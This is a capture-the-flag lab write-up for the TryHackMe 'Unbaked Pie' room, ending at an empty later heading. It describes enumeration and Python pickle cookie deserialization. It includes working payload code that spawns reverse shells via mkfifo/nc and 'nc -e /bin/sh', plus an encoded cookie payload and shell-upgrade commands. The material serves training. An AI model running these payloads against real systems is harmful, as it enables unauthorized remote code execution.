# Unbaked Pie

![image](https://user-images.githubusercontent.com/5285547/135349199-38047830-0a14-4914-b35e-962103097322.png)

Room link: https://tryhackme.com/room/unbakedpie

## Enumeration

Nmap 

Starting my enumration with an nmap scan as usual, after a long scan only one port comes back to me, filemaker!?

```
PORT     STATE SERVICE
5003/tcp open  filemaker
```

## Port 5003

![image](https://user-images.githubusercontent.com/5285547/135356072-c5ced1a8-8140-42df-8d63-4ba43fe176ff.png)

Seems to be a website all about pickles and pickle products. 
Typing in the wrong path gave lots of info back from the host. 

![image](https://user-images.githubusercontent.com/5285547/135356353-88a8b03a-fc30-4a43-9643-41d5aa543eac.png)

![image](https://user-images.githubusercontent.com/5285547/135356371-a2862edc-20e7-4789-aed5-5fcc8afecab0.png)

## Pickle (python) (Decode)

Looking about the web app I notice in burp suite the request headers also point to python

![image](https://user-images.githubusercontent.com/5285547/135357480-734281a9-a09f-4af8-b86c-b90da5b7beb5.png)

When using the search feature on the site we can see a cookie being set (maybe also being deseralised) 

![image](https://user-images.githubusercontent.com/5285547/135357550-509b26c2-4449-459f-b1f8-fbcdb70a6985.png)

Set-Cookie

```
gASVCgAAAAAAAACMBmFzZGFzZJQu
```

Decoding the cookie value using python pickle

![image](https://user-images.githubusercontent.com/5285547/135357609-2b7aee9e-905f-486a-9064-e6b40d8b3c4f.png)

```
import pickle
import base64


string_val = b"gASVCgAAAAAAAACMBmFzZGFzZJQu"
string_val = base64.b64decode(string_val)
d = pickle.loads(string_val)
print(d)
```

## RCE (Encode)

Using this [here](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) article which helps to get a better understanding of the python pickle rce. We can craft a payload to work here. 

Original RCE code

```
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

## Root

Editing the code we can get RCE via the serilization. 

```
import pickle
import base64


#string_val = b"gASVCgAAAAAAAACMBmFzZGFzZJQu"
#string_val = base64.b64decode(string_val)
#d = pickle.loads(string_val)
#print(d)

import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('nc -e /bin/sh IP PORT')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

```
python3 pickl3.py
b'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uYyAtZSAvYmluL3NoIDEwLjguMTUzLjEyMCA5OTk5lIWUUpQu'
```

Swapping the cookie and calling /search (GET) we can get the code exection. 

![image](https://user-images.githubusercontent.com/5285547/135358609-2ad8541c-2223-466d-96b0-64f1262c1875.png)

After getting on we can update our shell. 

```
python3 -c "import pty;pty.spawn('/bin/bash')"
stty raw -echo;fg
reset
xterm
```

Now we can enumerate again to find more information. 

## Enumeration 2


